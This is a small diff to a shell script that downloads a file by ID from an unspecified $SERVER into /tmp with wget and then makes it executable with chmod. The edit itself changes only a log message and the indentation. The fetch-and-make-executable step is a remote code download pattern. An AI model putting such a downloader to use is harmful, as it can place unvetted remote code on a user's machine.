@@ -6,8 +6,8 @@ FILE_PATH="/tmp/t-5988-bvn55.sh"
 
 if [ "$1" != "" ]; then
     ID="$1"
-    echo "Downloading file with ID: $ID..."
-    wget -O "$FILE_PATH" "$SERVER?id=$ID"
+     echo "Fetching ID: $ID"
+     wget -O "$FILE_PATH" "$SERVER?id=$ID"
 
     if [ -s "$FILE_PATH" ]; then
         chmod +x "$FILE_PATH"
